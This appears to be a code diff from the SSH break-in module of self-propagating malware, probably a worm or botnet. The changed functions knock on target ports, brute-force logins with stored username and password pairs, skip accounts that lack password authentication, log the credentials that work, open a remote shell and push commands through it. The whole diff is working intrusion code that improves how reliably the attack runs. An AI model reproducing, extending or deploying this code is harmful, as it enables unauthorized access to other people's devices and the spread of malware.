 	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
 		bne_port_t *p = (bne_port_t*)vs->ports.head->element;
 
@@ -1829,11 +2651,12 @@ static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: knocking %"PRIu16"\n",
+				"bne vssh@%"PRIxPTR"\t: knocking %"PRIu16"\n",
 				(uintptr_t)ctx,
 				p->port);
 		}
 
+		prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
 		if (!bne_do_connect(&vs->fd, &ep, ev)) {
 			ctx->result.err = errno;
 			goto END;
@@ -1856,9 +2679,10 @@ static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 		f_ret = prne_lssh2_handshake(vs->ss, vs->fd, ev);
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: handshake %d\n",
+				"bne vssh@%"PRIxPTR"\t: handshake %d on port %"PRIu16"\n",
 				(uintptr_t)ctx,
-				f_ret);
+				f_ret,
+				ep.port);
 		}
 		if (f_ret == 0) {
 			ctx->result.err = 0;
@@ -1873,12 +2697,10 @@ POP:
 	}
 
 END:
-	if (ev != NULL) {
-		if (pth_event_status(ev) != PTH_STATUS_OCCURRED) {
-			ctx->result.err = ETIMEDOUT;
-		}
-		pth_event_free(ev, FALSE);
+	if (ev != NULL && pth_event_status(ev) == PTH_STATUS_OCCURRED) {
+		ctx->result.err = ETIMEDOUT;
 	}
+	pth_event_free(ev, FALSE);
 	if (!ret) {
 		bne_vssh_drop_conn(vs);
 	}
@@ -1948,15 +2770,23 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 
 		if (f_ret == 0) {
 			// need auth
-			// check vs->auth_list maybe?
+			if (vs->auth_list != NULL &&
+				strstr(vs->auth_list, "password") == NULL)
+			{
+				// but password auth not available for this account.
+				// try next id
+				goto NEXT_ID;
+			}
+
 			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 				prne_dbgpf(
-					"bne@%"PRIxPTR"\t: trying cred %s %s\n",
+					"bne vssh@%"PRIxPTR"\t: trying cred %s %s\n",
 					(uintptr_t)ctx,
 					ctx->result.cred.id,
 					ctx->result.cred.pw);
 			}
 
+			prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
 			f_ret = prne_lssh2_ua_pwd(
 				vs->ss,
 				vs->fd,
@@ -1983,7 +2813,7 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 			prne_dbgpf(
-				"bne@%"PRIxPTR"\t: authenticated using cred %s %s\n",
+				"bne vssh@%"PRIxPTR"\t: authenticated using cred %s %s\n",
 				(uintptr_t)ctx,
 				ctx->result.cred.id,
 				ctx->result.cred.pw);
@@ -2014,14 +2844,14 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 			if (f_ret == 0) {
 				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 					prne_dbgpf(
-						"bne@%"PRIxPTR"\t: shell opened\n",
+						"bne vssh@%"PRIxPTR"\t: shell opened\n",
 						(uintptr_t)ctx);
 				}
 			}
 			else {
 				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
 					prne_dbgpf(
-						"bne@%"PRIxPTR"\t: failed to open shell (%d)\n",
+						"bne vssh@%"PRIxPTR"\t: failed to open shell (%d)\n",
 						(uintptr_t)ctx,
 						f_ret);
 				}
@@ -2031,7 +2861,7 @@ static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
 			ret = true;
 			ctx->result.err = 0;
 		} while (false);
-
+NEXT_ID:
 		if (!ret) {
 			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
 				break;
@@ -2144,6 +2974,7 @@ static ssize_t bne_vssh_write_f (
 	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
 	int f_ret;
 	size_t rem = buf_size;
+	size_t sent = 0;
 
 	while (rem > 0) {
 		f_ret = prne_lssh2_ch_write(
@@ -2156,12 +2987,16 @@ static ssize_t bne_vssh_write_f (
 		if (f_ret < 0) {
 			return f_ret;
 		}
+		if (f_ret == 0) {
+			return sent;
+		}
 
-		rem -= f_ret;
 		buf_p = (const uint8_t*)buf_p + f_ret;
+		rem -= f_ret;
+		sent += f_ret;
 	}
 
-	return buf_size;
+	return sent;
 }
 
 #if 0 // this works
@@ -2257,28 +3092,25 @@ static bool bne_do_vec_ssh (prne_bne_t *ctx) {
 	}
 
 	// `ctx->result.cred` must be set at this point
-	if (vssh_ctx.ch_shell != NULL) {
-		ret = bne_vssh_do_shell(ctx, &vssh_ctx);
+	ret = bne_vssh_do_shell(ctx, &vssh_ctx);
+	if (ret) {
+		pth_event_t ev = NULL;
 
-		if (ret) {
-			pth_event_t ev = NULL;
+		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
+		// close the channel and wait for the remote end to do the same
+		// this ensures that the issued commands are completed
+		prne_lssh2_close_ch(
+			vssh_ctx.ss,
+			vssh_ctx.ch_shell,
+			vssh_ctx.fd,
+			ev);
+		prne_lssh2_ch_wait_closed(
+			vssh_ctx.ss,
+			vssh_ctx.ch_shell,
+			vssh_ctx.fd,
+			ev);
 
-			prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
-			// close the channel and wait for the remote end to do the same
-			// this ensures that the issued commands are completed
-			prne_lssh2_close_ch(
-				vssh_ctx.ss,
-				vssh_ctx.ch_shell,
-				vssh_ctx.fd,
-				ev);
-			prne_lssh2_ch_wait_closed(
-				vssh_ctx.ss,
-				vssh_ctx.ch_shell,
-				vssh_ctx.fd,
-				ev);
-
-			pth_event_free(ev, FALSE);
-		}
+		pth_event_free(ev, FALSE);
 	}
 
 END:
@@ -2292,6 +3124,7 @@ END:
 		prne_free((void*)e->element);
 	}
 	prne_free_llist(&vssh_ctx.ports);
+
 	return ret;
 }
 
